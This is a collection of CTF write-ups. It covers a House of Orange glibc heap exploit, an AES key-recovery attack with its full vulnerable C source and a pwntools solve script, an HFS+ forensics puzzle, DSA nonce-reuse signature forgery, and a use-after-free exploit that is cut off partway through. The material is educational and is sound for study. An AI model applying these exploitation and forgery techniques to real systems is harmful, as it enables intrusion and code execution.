3626           victim->fd = fwd;
3627           fwd->bk = victim;
3628           bck->fd = victim;
...
3633         }
```
The unsafe unlinking happens in line 3553. This line enables an attacker controlling the `bk` pointer of a chunk in the unsorted bin to overwrite any data with the `unsorted_chunks(main_arena)` (which is 0x10 bytes before `main_arena.bins`). If the size of that controlled chunk matches the requested size (line 3557) the code will return that chunk immediately.

The _House of Orange_ uses this attack and overwrites `_IO_list_all`. Then jumps to `_IO_flush_all_lockp` which is invoked in program's termination. Here is the relevant code:
```
 778   fp = (_IO_FILE *) _IO_list_all;
 779   while (fp != NULL)
 780     {
...
 785       if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
 786 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
 787        || (_IO_vtable_offset (fp) == 0
 788            && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
 789                     > fp->_wide_data->_IO_write_base))
 790 #endif
 791        )
 792       && _IO_OVERFLOW (fp, EOF) == EOF)
 793     result = EOF;
...
 806     fp = fp->_chain;
 807     }
```
In the first iteration of the loop we don't have too much control, as the fields pointed by `fp` are  the `main_arena`'s bins (the data following the `unsorted_chunks`). We can only make them either point to the `libc` data (empty bin) or to the heap (if the bin has some freed chunks). So our objective in the first iteration is to avoid line 792 - the indirect invocation of the `__overflow` method. This actually happens automatically as `fp->_IO_write_ptr` and `fp->_IO_write_base` contain the same value (both are head and tail of the same bin). Then, in line 806 we de-reference `fp->_chain`, which happens to coincide with 0x60-size bin. So we need to populate that bin with a pointer to our controlled data on the heap. We do it in two steps: first, we overwrite a chunk in the unsorted bin to point to our controlled data on the heap and make an allocation. Now, the `bk` pointer of the `unsorted_chunks` points to our controlled data. We craft this data to look like a chunk of size 0x61 with a `bk` pointer pointing to a crafted chunk with size 0x311 and `bk` that points to `_IO_list_all`.  This will cause the `fp` in the second iteration to point to our controlled data, where we can satisfy the conditions to invoke the `__overflow` method using our controlled `vtable` pointer (if you unfold all these awful macros you get something like `fp->_vtable.__overflow(fp, EOF)`).

The exploit we described so far is perfect for  glibc 2.23. However, in glibc version 2.24 a new mitigation was added: `IO_validate_vtable` function which ensures that the `FILE` object's `vtable` points somewhere within the `__libc_IO_vtables` section (it's worth reading the implementation, there are nice gems in there). So, this restricts us a little bit. But don't worry! There are plenty of functions pointed in the `__libc_IO_vtables` section and one of them is perfect for our needs: `_IO_wstr_finish`.
Here is the code:
```
325 void
326 _IO_wstr_finish (_IO_FILE *fp, int dummy)
327 {
328   if (fp->_wide_data->_IO_buf_base && !(fp->_flags2 & _IO_FLAGS2_USER_WBUF))
329     (((_IO_strfile *) fp)->_s._free_buffer) (fp->_wide_data->_IO_buf_base);
```
As we control `fp`, we can quite easily satisfy the condition in line 328 and hijack the flow - faking the `_free_buffer` function pointer.
A `one_gadget` is all it takes from here to get to `system("/bin/sh")`.

You can read the [full exploit here](x.py).



### File: writeups/confidence_2017/crypto/writeup.md

# Crypto Solution

This challenge was a huge fun.

We are receieved a source code of a service written in C, which sends us a flag encrypted with AES and let us do some operations. The purpose of the challenge is to decrypt the flag.

The program starts with generating 16 AES keys of 16 bytes long each and put them in a _keystore_ array of bytes. Each entry in the _keystore_ is 17 bytes long - 16 bytes for the key and 1 byte for the key length. Then, it loads the first key from the store to the `current_key` buffer and uses it to encrypt and send the flag.
From that point, we can do the following operations:
1. regenerate key - sending key _index_ and _length_, the code reads _length_ bytes from `/dev/urandom` to the key in the specified _index_ and sets it's length to be the specified _length_.
2. load key - copies a key from the specified _index_ in the key store to the beginning of the `curent_key` buffer according to the _length_ of the specified key.
3. load data - reads 16 bytes of data from the user and puts them in a buffer.
4. encrypt - encrypt the data buffer with the current key and sends it to the client.

The challenge is written in C which implies some low level vulnerability. We took a quick look and found a nice integer overflow. The code works with pointer's arithmetic to derive the offset of the entry in the _keystore_, by multiplying the _index_ specified by the user with 17 - which is easily overflown. However, the code **does check** the result is within the boundaries of the _keystore_. So our vulnerabiliy only lets us escape the entry alignment when accessing the _keystore_, but we can't write outside the buffer. Sending an _index_ which is a mutiple of the modular inverse of 17 under 2^32 will cause the multiplication to result with any value we want.

Now, applying our vulnerability to operation 1 and sending zero length enables us to write a zero byte to weherever we want within the _keystore_.
From here, our algorithm is simple. We regenerate the key in index 1 with sizes from 0 to 15 and each time fill the key with zeros. Then we load this key to the `current_key` and encrypt a plain text with the current key.
The result is that we have `AES(known_plain_text, '0' * len + original_key[len:])` for each length between zero and 15. We can now brute force the cipher text in reverse order and deduce the bytes of the original key one at a time.
Then, we decrypt the original flag with the key we have and we are done.

## Original Challenge

```C
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "aes.h"

#define MAX_KEY_LEN 16
#define KEY_SIZE_LEN 1
#define ENTRY_SIZE (MAX_KEY_LEN + KEY_SIZE_LEN)
#define NUM_KEYS 16
#define STORAGE_SIZE (ENTRY_SIZE * NUM_KEYS)
#define MASTER_KEY_INDEX 0
#define DATA_SIZE 16

uint8_t keys[STORAGE_SIZE];
uint8_t data[DATA_SIZE];
uint8_t current_key[MAX_KEY_LEN];

void regenerate_key(unsigned int index, unsigned int len) {
  unsigned int offset = index * ENTRY_SIZE;

  if (offset > STORAGE_SIZE - ENTRY_SIZE || len > MAX_KEY_LEN) {
    return;
  }

  int fd = open("/dev/urandom", O_RDONLY);
  read(fd, &keys[offset], len);
  close(fd);
  keys[offset + MAX_KEY_LEN] = len;
}

void load_key(unsigned int index) {
  unsigned int offset = index * ENTRY_SIZE;
  unsigned int key_len = keys[offset + MAX_KEY_LEN];
  if (offset > STORAGE_SIZE - ENTRY_SIZE || key_len > MAX_KEY_LEN) {
    return;
  }
  memcpy(current_key, &keys[offset], key_len);
}

void encrypt(void) {
	uint8_t data_out[DATA_SIZE];
	AES128_ECB_encrypt(data, current_key, data_out);
	write(1, data_out, 16);
}

void load_data(void) {
  int ret;
  
  ret=read(0, data, DATA_SIZE);
  if (ret < 1)
    exit(0);
}

int main(void) {
  int ret;
  int i;
  for (i = 0; i < NUM_KEYS; i++) {
    regenerate_key(i, MAX_KEY_LEN);
  }
  
  int fd = open("flag.txt", O_RDONLY);
  read(fd, data, DATA_SIZE);
  close(fd);
  
  load_key(MASTER_KEY_INDEX);
  encrypt();
  
  memset(data, 0, DATA_SIZE);
  regenerate_key(MASTER_KEY_INDEX, MAX_KEY_LEN);
  
  char cmd;
  unsigned int p1, p2;
  while(1) {
    ret = read(0, &cmd, 1);
    if (ret < 1)
      return 0;
    if (cmd == 'l') {
      load_data();
    } else if (cmd == 'e') {
      encrypt();
    } else if (cmd == 'r') {
      ret = read(0, &p1, sizeof(p1));
      if (ret < 1)
	return 0;
      ret=read(0, &p2, sizeof(p2));
      if (ret < 1)
	return 0;
      regenerate_key(p1, p2);
    } else if (cmd == 'k') {
      ret=read(0, &p1, sizeof(p1));
      if (ret < 1)
	return 0;
      load_key(p1);
    }
  }
}
```

To build the code add the following code as `aes.h` and compile with `-lcrypto` (tested on Ubuntu 16.04).
```C
#include <openssl/evp.h>
#include <stdint.h>

void AES128_ECB_encrypt(void *data, void *current_key, void *data_out) {
	unsigned int inlen = 16, outlen = 16;
	EVP_CIPHER_CTX ctx;
	EVP_CIPHER_CTX_init(&ctx);
	EVP_EncryptInit(&ctx, EVP_aes_128_ecb(), current_key, NULL);
	EVP_EncryptUpdate(&ctx, data_out, &outlen, data, inlen);
}
```

## Solution
```Python
from pwn import *
from Crypto.Cipher import AES

#r = remote("enc-service.hackable.software", 1337)
r = process("./a.out")

inv = 4042322161
def offset(o):
    return (o * inv) % (2**32)

def set_key(off, length):
    r.send('r' + p32(off) + p32(length))

def load_key(off):
    r.send('k' + p32(off))

def enc(data):
    r.send('l' + data)
    r.send('e')
    return r.recvn(16)

enc_flag = r.recvn(16)

KPT = '\0' * 16
CPH = []

CPH.append(enc(KPT))

for i in xrange(16):
    set_key(1,i+1)
    for j in xrange(i+1):
        off = offset(j+1)
        set_key(off,0)
    load_key(1)
    CPH.append(enc(KPT))

for i,c in enumerate(CPH):
    print i, c.encode('hex')

print AES.new(KPT).encrypt(KPT) == CPH.pop()

key = ['\0'] * 16

for i, ct in enumerate(reversed(CPH)):
    for c in xrange(256):
        key[i] = chr(c)
        if AES.new(''.join(reversed(key))).encrypt(KPT) == ct:
            print "found", i, ":", hex(c)
            break

print "+" * 70
print AES.new(''.join(reversed(key))).decrypt(enc_flag)
print "+" * 70
```



### File: writeups/confidence_teaser_2017/index/index_writeup.md

# Teaser CONFidence CTF 2017 - INDEX challenge writeup
_chksum[0]/Michael Kajiloti_

## Challenge Description
##### INDEX (Forensics, 400)
_A hipster friend who uses macs and listens to weird music sent me a disk image and this note:_
>I’m a collector and I’ve always been misunderstood
>I like the things that people always seem to overlook
>I gather up and catalog it in a book I wrote
>There’s so much now that I forget if I don’t make a note

[Download](https://s3.eu-central-1.amazonaws.com/dragonsector2-ctf-prod/index_cb9ed1eb3a9096700e5a821d0c3866fb806ac6522bdbdf5846a205e96cbc91fa/index.img.xz)

### Hey... Steven Wilson is not Weird!
I immediately recognized the text in the note, which is taken from the [lyrics](http://www.azlyrics.com/lyrics/stevenwilson/index293967.html) of a Steven Wilson song called [Index](https://www.youtube.com/watch?v=-UoKIiw-p2g).
Unfortunately, this observation didn't prove to be helpful in solving the challenge, but it did make me want to listen to Steven Wilson.
Anyways, I want to clarify that Steven Wilson is not weird, he is genius, and that hipster friend has good taste in music :)
Now that that's clear...

## It said he uses macs
Downloading the disk image file, and running  _file_ on it, revealed that its an [HFS+ disk image](https://en.wikipedia.org/wiki/HFS_Plus), used on macOS, which is not surprising considering the challenge description.

I used [HFSexplorer](http://www.catacombae.org/hfsexplorer/) to open and extract the disk image's contents, and found that it contains a root folder called `INDEX`, inside a `flag.png` file and 26 duplicates of it named `a` to `z` accordingly. Another duplicate file called `inode19` was located at `HFS+ Private Data` folder. Now that's weird (not Steven Wilson!). Steganography? Maybe.. but even then I needed more clues to continue.
The only other thing inside the disk image was a `.fseventsd` folder, with 4 small gzipped files inside. That's it?

### What are you hiding?
Inspecting the disk image manually in a hex editor, showed it contains many golang runtime strings, which is suspicious as I couldn't find a golang binary with HFSexplorer. Besides, the image file was around 25MB, and seemed to contain a lot of binary data that is not visible as files on the filesystem. I assumed the golang file, among others, were deleted from the filesystem, so I tried using forensics tools such as [The Sleuth Kit](https://wiki.sleuthkit.org/index.php?title=The_Sleuth_Kit) and some disk recovery programs in order to detect/recover the deleted files, but I got no results.

I was then reminded that binwalk exists! So I ran binwalk with high hopes... only to learn what I already know...
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
513504        0x7D5E0         Unix path: /usr/lib/locale/TZ/
537952        0x83560         Unix path: /usr/share/lib/zoneinfo/
553600        0x87280         Unix path: /usr/local/Cellar/go/1.6.1/libexec
975424        0xEE240         Unix path: /usr/local/Cellar/go/1.6.1/libexec/src/unicode/tables.go
1059833       0x102BF9        Minix filesystem, V1, little endian, 0 zones
--- SNIPPED ----
1060121       0x102D19        Minix filesystem, V1, little endian, 0 zones
4530176       0x452000        PNG image, 2000 x 2153, 8-bit/color RGBA, non-interlaced
4530364       0x4520BC        Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#">
4530578       0x452192        Unix path: /purl.org/dc/elements/1.1/"
15228928      0xE86000        gzip compressed data, from Unix, NULL date (1970-01-01 00:00:00)
15237120      0xE88000        gzip compressed data, from Unix, NULL date (1970-01-01 00:00:00)
15241216      0xE89000        gzip compressed data, from Unix, NULL date (1970-01-01 00:00:00)
15245312      0xE8A000        gzip compressed data, from Unix, NULL date (1970-01-01 00:00:00)
24333124      0x1734B44       End of Zip archive
```

No golang binary detected. The 4 gzip files shown in the output are actually the files inside .fseventsd folder, which brings us to... what are these files?

### Always check the logs
 A quick search revleaed these to be [filesystem events daemon logs](https://techblog.willshouse.com/2011/05/05/what-is-fseventsd/). I parsed them using a useful tool called [FSEventsParser](https://github.com/dlcowen/FSEventsParser), which resulted in some interesting filesystem logs (snipped results shown).

| wd                   | mask_hex   | filename             | mask                                                              | record_end_offset | source              | source_created_time        | source_modified_time       | other_dates |
|----------------------|------------|----------------------|-------------------------------------------------------------------|-------------------|---------------------|----------------------------|----------------------------|-------------|
| 18147469118082277088 | 0x04000003 | NULL                 | FolderEvent;Mount;InodeMetaMod;                                   | 25                | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082268290 | 0x48000001 | .Trashes             | FolderEvent;Renamed;FinderInfoMod;                                | 46                | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082268286 | 0x88010001 | .Trashes.kuFGRj      | FolderEvent;Renamed;PermissionChange;FolderCreated;               | 74                | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082273077 | 0x03009000 | __1__                    | Created;HardLink;__Removed__;FileEvent;                               | 88                | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082273104 | 0x03009000 | __10__                   | Created;HardLink;__Removed__;FileEvent;                               | 103               | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082273374 | 0x03009000 | __100__                  | Created;HardLink;__Removed__;FileEvent;                               | 119               | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082276074 | 0x03009000 | __1000__                 | Created;HardLink;__Removed__;FileEvent;                               | 136               | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN      |
| >> SNIPPED
| 18147469118082268320 | 0x01009000 | a                    | Created;HardLink;FileEvent;                                       | 21268             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082268326 | 0x01009000 | b                    | Created;HardLink;FileEvent;                                       | 21282             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082268329 | 0x01009000 | c                    | Created;HardLink;FileEvent;                                       | 21296             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082277254 | 0x15028000 | __d__                    | Modified;InodeMetaMod;Created;__ExtendedAttrModified__;FileEvent;     | 21310             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082277010 | 0x01009000 | e                    | Created;HardLink;FileEvent;                                       | 21324             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082277016 | 0x01009000 | f                    | Created;HardLink;FileEvent;                                       | 21338             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082268317 | 0x11038000 | __flag.png__             | Modified;Created;PermissionChange;__ExtendedAttrModified__;FileEvent; | 21359             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082277019 | 0x01009000 | g                    | Created;HardLink;FileEvent;                                       | 21373             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082277022 | 0x01009000 | h                    | Created;HardLink;FileEvent;                                       | 21387             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     | 
| >> SNIPPED
| 18147469118082277233 | 0x13008000 | __tmp1__                 | Modified;Created;__Removed__;FileEvent;                               | 21572             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| >> SNIPPED
| 18147469118082277260 | 0x13008000 | __tmp12__                | Modified;Created;__Removed__;FileEvent;                               | 21626             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| >> SNIPPED
| 18147469118082277067 | 0x01009000 | u                    | Created;HardLink;FileEvent;                                       | 21776             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| 18147469118082277070 | 0x01009000 | v                    | Created;HardLink;FileEvent;                                       | 21790             | ..\fbd8c30373aa5f99 | 2017-04-02 04:36:50.684744 | 2017-04-02 04:36:50.685744 | UNKNOWN     |
| >> SNIPPED

From the logs we learn:
- Files with names numbered `1` - `1311` were created and deleted (all hardlinks)
- 12 Other files, named `tmp1` - `tmp12` were created and deleted (all hardlinks)
- Among the files that were not deleted, files `d` and `flag.png` had their extended attributes modified

### What was that about "catalog" in the note?
All of this is intersting, but what's next?.
Reading a bit on HFS reveals that it works with a catalog file (It's in the song duh!) that stores the directory structure and filesystem metadata. Conveniently, HFSExplorer has a catalog file view, that allows you to inspect the structure and metadata of the filesystem.

What immediately pops up is the node numbered `1337` (looks like a hint..), There is a gap of 1311 between it and the previous node `26`, (That explains the deleted numbered 1-1311 files in the logs..).
Going over the file nodes, reveals nodeID `1337` belongs to the file `d`. After examining this file's metadata carefully, I noticed it has a [Resource Fork](https://en.wikipedia.org/wiki/Resource_fork), which is sort of macOS's version of alternate data stream in Windows. AHA! so this is what _"people tend to overlook"_.

![alt](images/hfsexplorer_resourcefork2.png)

Also, a bit more digging reveals that nodeID `19` (`iNode19` file) is the only file with a data fork, meaning its the original flag.png file. All the other "flag" duplicates are hard links to it.

### Just let me see what you got there
Turns out, _viewing_ the resource fork itself is not so simple...
Mounting the drive on a mac and using the native command `index.img/..namedfork/rsrc` shows it actually has no resource fork. Using multiple different forensic tools, yielded the same results. Maybe it has something to do with what we saw in the logs - that the metadata for `d` has been modified. Also HFSexplorer doesn't show where the resource fork is actually located on the disk.

After getting stuck and frustrated for an hour or two, doing some crazy [HFS research here](https://developer.apple.com/legacy/library/technotes/tn/tn1150.html), I got a great advice and downloaded this [HFS drive template for 010 editor](https://www.sweetscape.com/010editor/repository/files/Drive.bt). This allowed me to actually see the resource fork's location and size in blocks on disk. The resource fork's data is split in 2 locations (extents) on disk. Looking at the volume header we can see the block size is `4096` bytes, and the first extent's startBlock is `5773`, so the address in bytes is `0x168D000`.

![alt](images/010_resourcefork.png)

And what do you know... it's a 64bit mach-o binary file signature. Useless automated forensic tools!
Extracting the 2 data pieces, appending them together to a single file, and opening it in IDA, shows its a golang binary. More precisely THE golang binary I was looking for!

### Solve it for me please
Running the executable as is, simply does nothing.
Now, we assumed that this binary contains the logic to extract the flag text from the `flag.png` file.
Looking at the strings inside the binary we saw what seemed like a file path: `/.vol/16777221/19`. I recognized the number `19`, as being the original flag file `inode19`.
Since we had a mac nearby, we simply copied `flag.png` to `/.vol/16777221/19` and ran the executable.

It worked! the binary printed out the flag! I love Steven Wilson!

### Last but not least
If you came this far, check out [porcupine tree](https://en.wikipedia.org/wiki/Porcupine_Tree), they are amazing.

_chksum[0]_














### File: writeups/confidence_teaser_2017/public_key_infrastructure/pki-writeup.md


# Public Key Infrastructure

This is a short writeup on solving the 'Public Key Infrastructure' challenge from the CONfidence teaser CTF by DragonSector.

## The Challenge

We are given an address of a service that runs some [code](task.py) written in python.

This code implements a service with two functionalities: `register` and `login` which maps to `sign` and `verify`.
The user may ask to sign any name except _admin_ and get some signature. Then, a user can ask to login, providing the username and a signature to get some response from the system.

From the code above, the objective of the challenge is to pass the `verify` function on the _admin_ name and thus get the flag from the `login` function.

## The Dawn Of DSA

Going over the code, this looks like some signing algorithm which signs/verifies user's messages. A quick search comes up with a very similar algorithm: [DSA](https://en.wikipedia.org/wiki/Digital_Signature_Algorithm).

Comparing DSA outline in wikipedia and the challenges' code, we see the following differences/peculiarities:

* `r,s` in the signature mustn't be zero in DSA, yet in the challenge they might be
* `n`, which does not exist in DSA, is used in the **beginning** of strings in the `makeK` and `makeMsg` functions
* `k` must be **random** per message, however it's computed with a hash function (deterministic)
* the hash function used for computing k - md5 - is insecure
* the message can be signed locally (no nonce/salt in the username hash)
* the signature `(r,s)` is encoded as ${(s + r*Q)^e mod\ n}$ where $e = 2^{16} + 1$

## Things That Didn't Work

The first implementation mistake seems very promising. Since we provide the signature to verify, it is very easy to pass a signature such that `r == 0`. Working the equations in the `verify` process, we get that:
$$u2 \equiv r * w = 0$$
$$v \equiv (G^{u1} * PUBLIC^{u2}) mod\ P\ mod\ Q \equiv G^{u1} * 1 mod\ P\ mod\ Q$$
Which completely eliminates the public/private component in the system.

So, in order to solve the challenge, all we need is to find a $u1$ and an integer $\alpha$ such that $Q$ divides $g^{u1}-\alpha * P$ so the comparison of `v` and `r` holds true ($v = G^{u1}\ mod\ P\ mod\ Q \equiv 0 = r$).

Unfortunately, finding this value is computationaly **hard**. We suspect it is equivalent to the discrete logarithm problem. Just to make sure, we wrote a small brute-force and let it run, but it didn't return any results.

We also thought maybe put 'name: admin' as part of `n`, and trick the server to sign a request the will hold for `name = 'admin'`, but it was impossible.

## Back On Track

Looking at the other implementation problems, we started wondering what happens if we generate the same `k` for different messages. Some digging online resulted with a short blog describing a [very simple attack](https://rdist.root.org/2010/11/19/dsa-requirements-for-random-k-value/).
To implement this attack, we need the following:
* two messages - `m1,m2` such that `h(m1) != h(m2)` yet `k(m1) == k(m2)`
* getting the hash, `s` and `r` of each of the messages

If we have all that, we can compute k as following:
$$k = ({h(m1) - h(m2)) * (s(m1) - s(m2))^{-1}\ mod\ Q}$$
and than, get the private key from the following formula:
$$PRIVATE = ((s(m1) * k) - h(m1)) * r^{-1}\ mod\ Q$$

After getting the private key, we can sign any message (since we know how to generate the hash for a message).
Note that even though we don't get the SECRET using this message, it doesn't matter because the only requirement from K is to be random and it's generation method is not used anywhere in the original algorithm.

## Hashes In Colide

The first step in our plan is to create a hash collision on `k` for two different messages.
Looking at the code, we see:

```python
k = int(hashlib.md5('K = {n: ' + n + ', name: ' + name + ', secret: ' + SECRET + '}').hexdigest(), 16)
```
We have no limitiations on `n`, so we can genearate an MD5 collision on `'K = {n: ' + n ` using [fastcoll](https://github.com/upbit/clone-fastcoll). Due to the [Merkle-Damgard construction](https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction) of MD5, if the prefixes collide, adding the same suffix to both messages will also result in collision. Thus, the `SECRET` and limitations on `name` don't really bother us.

## Getting The Signature

Here we find ourselves in an uncharted territory. The register function returns ${(s + r*Q)^e mod\ n}$ where $e = 2^{16} + 1$ and we need to get the original `s,r`.

The solution was quite ineteresting. We can extend `n` as much as we want. Padding `n` with `\x00` bytes is, in-fact, multiplying `n` by $256$.  We note that $x\ mod\ nm\ mod\ m \equiv x\ mod\ m$ for any $n,m$.
So we pad our collision with enough `\x00` that eventually $2^{320} = 16^{40}$ divides $n$ (why 320? because $Q$ is 160 bit, thus $s + r*Q$ is at most $160*2$ bit)

Then, we send a _register_ request with some name and our `n`. Now, denote $sig := s + r*Q$, so the result is $sig^{e} mod\ n$. According to the fact above follows: $sig^{e} mod\ n\ mod\ 2^{320} = sig^{e} mod\ 2^{320}$. We compute $d \equiv e^{-1} mod\ \varphi (2^{320})$ (therefore exists $t$ such that $e*d - 1 = t * \varphi(2^{320})$). According to [Euler's Theorem](https://en.wikipedia.org/wiki/Euler%27s_theorem) if $sig$ is odd ($sig,2^{320}$ are co-prime) then 
$$(sig^{e})^{d} \equiv sig^{e*d} \equiv sig * sig^{e*d - 1} \equiv sig * sig^{t * \varphi(2^{320})} \equiv sig * (sig^{\varphi(2^{320})})^t \equiv sig * 1^t \equiv sig $$.

And this is how we can extract the original $sig$.

If $sig$ is not odd, this fails miserably and $(sig^{e})^{d}$ will result in 0, giving us a good indication wether we extracted a valid signature or not.

## Executing The Attack

We take the hash collisions we found for the prefix 'K ={n: ' and extend it with 40 '\x00', denote it with `n1,n2`.
Then choose a `name` - 'a' and send _register_ requests to the server with `name` and `n1,n2` and exponentiate the response by $e^{-1}\ mod\ \varphi(2^{320})$ and save it as `sig1` and `sig2`.
If the responses are even, we try again with a different name.
We can verify we extracted the correct signatures by sending a _login_ request to the server with the signatures.
Then, we extract `r` and `s` for each signature and compute the hashes of the messages locally:
```python
r1, r2 = sig1 / Q, sig2 / Q ## in fact - the same value
s1, s2 = sig1 % Q, sig2 % Q
h1,h2 =  h(makeMsg(name, n1)), h(makeMsg(name, n2))
```
and then compute `k` and then the `PRIVATE` key:
```python
k = ((h1 - h2) * modinv(s1 - s2, Q)) % Q
PRIVATE = ((s1 * k - h(makeMsg(name, n1))) * modinv(r1, Q)) % Q
```
(the calculation of `PRIVATE` according to `n1` and `n2` are the same and correspond to the `PUBLIC` key)
Now, we can sign any name - including _admin_ :)
```python
n = '' ## doesn't matter
k = 1 ## doesn't matter
r = pow(G, k, P) % Q
s = (modinv(k, Q) * (h(makeMsg(name, n)) + PRIVATE * r)) % Q
admin_sig = r*Q + s
```

And that's it. We have a valid signature for `name = 'admin'` (with `n = ''`) and we can now login and get the flag.

You may find the full solution's code [here](solve.py).



### File: writeups/googleCTF/assignment/writeup.md

---
author: Doron Sobol
---

Assignment Writeup
==================

A few weeks ago I’ve decided to improve my pwning skills and try some
exploitation challenges. A friend pointed me towards this cool challenge and
I’ve decided to share my solution.

In this CTF the goal was to exploit some server which ran a simple app called
*“assignment”*.

**Functionality:**
------------------

-   Assigning value to variables.

-   Adding variables/values and assigning the result to variable.

**Internal representation:**
----------------------------

Values could be of 3 types:

-   1 - String

-   0 - Int (64 bit)

-   2 - Object.

And were represented by a simple struct:

| Type    |
|---------|
| Value   |
| Is_used |

A variable is represented by the following struct:

| Name (char)             |
|-------------------------|
| Pointer to value struct |
| Pointer to next         |

An object is simply a pointer to list of variables.

A string:

| Size                     |
|--------------------------|
| Pointer to string buffer |

In addition the program manages the value allocations with a garbage collector.
Which run every 20 allocations of items and frees all the items which are
predecessor of the root object - which means all the items which doesn't have a
name or that does have a name but was overridden, and their immediate sons
(string or the list of variables for variables).

**Basic vulnerability**
-----------------------

When adding 2 values, the first thing been done is allocations of the new value,
but the values that we add can be free by the garbage collector in this
allocation but still used in the addition, yielding UAF vulnerability.

![](Pwning.png)

**Leaking memory**
------------------

First thing first we will leak an address in the heap. We will notice that the
first field in the value struct is the type, and that if the type is unknown the
“add” function will **regard it as an integer**.

We Will exploit it in the following way:

1.  add a string and an 0 value integer such that when the add function will
    allocate the value where the sum will be, the garbage collector will run.

2.  The the 2 values we add will be freed, return to their fastbin and their
    first field will be overridden by the free function.

3.  The add function will add the to values inside those freed items as if they
    were integers even though one of them is a pointer to the string.

4.  Now when we will print the variable we added the values to, we will get the
    pointer to the string.

**Arbitrary Read and Libc Address**
-----------------------------------

Now we have an address in the heap, so we can know relative addresses in the
heap but we would like to get an address in the libc section in order to get the
value of Libc_base and be able to write to the malloc hook and get code
execution. We would like to get a pointer in constant offset in the heap that
will point to the main arena - we will do that by simply allocating big enough
string and then freeing it using the garbage collector, now it will return to
the unsorted list in the heap and will point to the main arena which is in the
libc.

In order to read this address we will use a variation of the vulnerability again
but this time it will be a bit more complicated:

We will notice that the “add” function has a recursion when adding an object -
it adds all the elements in the object to the other value (if it isn’t also a
value). But when returning from the recursion the function checks again the type
of the parent object (the one that we already checked and was an object) and if
it is not an object it adds it as its current type - WTF?.

So we will be able to create an object that points to location of our choice by
adding an object to an integer and putting the result in the same object, if
exactly when allocating the new son of the object the garbage collector will
run, than when returning from the recursion the parent object that we add will
be freed and the function will treat it as an integer and put the result of it’s
value (the pointer to it’s old list of variables) plus the integer we add (which
we control), but the type will still be an object (since the type is determined
at the function start). So we will be able to put there whichever value that we
want.

**And in more details:**

1.  We will create an object (*a.s* = “aaaaaaaaa”)

2.  We will create an Integer (*z* = SOME_OFFSET)

3.  We will add *z* and *a* (*a=a+z*) in a way such that when the recursion will
    allocate the new *a.a* the garbage collector will run.

4.  The GC will free the old *a* (because it has already connected the new *a*
    to the root object).

5.  The recursion will return and check if *a* is an object, but a was freed so
    the type field was overridden by the free with a pointer.

6.  The “add” function will think that it adds 2 integers and will put the value
    of the old *a* (a pointer) plus *z* into the value field of the new *a,* but
    the field value of the new *a* will remain object type.

7.  We have an object that point to a location of our choice and we basically
    won.

8.  We create a string such that *a* will point to offset 16 of the raw string
    (will be explained). Now if we will put a string such that in location 16
    there is a value, we can create an item to our choice, so we will put there
    a string value, that will point to a location of our choice.

9.  We will do the same trick and create a string of our choice and make this
    string point to the location where we know we have a pointer to the libc.

10. We will print *a* and now we have a pointer to the libc.

**Arbitrary Write**
-------------------

In order to get arbitrary write we will use the fastbin attack that was used in
the babyheap challenge. We will want to free a chunk and then be able to
overwrite the “next” field in the chunk. To do this we will notice that when we
will free *a,* we will also free the variables that *a* points to which is the
middle of our controlled string. We will exploit it in the following way:

1.  Put a fake chunk header of size 0x70 before the value we have created (That
    is why we pointed to offset 16 and not to the start of the string).

2.  Free *a.* (and free our fake chunk)

3.  Rewrite the string to point to the address we want in the libc (malloc
    hook).

4.  Allocate chunks from the correct fastbin until allocating the chunk we’ve
    freed - the next allocation of size 0x70 will use the “next” field of our
    fake chunk a.k.a malloc hook.

5.  Allocating a string of size 0x70 that will contain the address we will want
